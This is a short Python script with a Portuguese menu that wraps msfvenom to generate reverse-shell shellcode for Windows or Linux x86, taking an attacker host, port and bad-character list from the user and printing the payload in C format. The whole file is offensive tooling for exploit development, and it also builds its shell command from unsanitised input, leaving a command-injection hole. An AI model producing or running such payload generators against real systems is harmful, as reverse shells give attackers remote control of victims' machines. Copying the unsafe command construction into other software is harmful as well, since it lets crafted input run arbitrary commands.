import subprocess
import time
import os

def create_shellcode(lhost, lport, badchar, payload):
    command = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -b "{badchar}" -f c'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    if process.returncode == 0:
        return output.decode('utf-8')
    else:
        return error.decode('utf-8')

def print_menu():
    print("*" * 40)
    print("   Bem-vindo ao Criador de Shellcode")
    print("*" * 40)
    print("Escolha um payload:")
    print("1. windows/shell_reverse_tcp")
    print("2. linux/x86/shell_reverse_tcp")
    print("*" * 40)

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def main():
    clear_screen()
    print_menu()
    choice = input("Digite o número correspondente ao payload: ")

    if choice == '1':
        payload = 'windows/shell_reverse_tcp'
    elif choice == '2':
        payload = 'linux/x86/shell_reverse_tcp'
    else:
        print("Escolha inválida.")
        return

    lhost = input("Digite o valor para LHOST: ")
    lport = input("Digite o valor para LPORT: ")
    badchar = input("Digite o valor para Badchar: ")

    clear_screen()
    print("Criando payload...")
    for _ in range(10):
        time.sleep(0.1)
        print("\b/", end="")
        time.sleep(0.1)
        print("\b-", end="")
    print("\n")

    shellcode = create_shellcode(lhost, lport, badchar, payload)

    clear_screen()
    print("Shellcode criado:")
    print(shellcode)

if __name__ == '__main__':
    main()
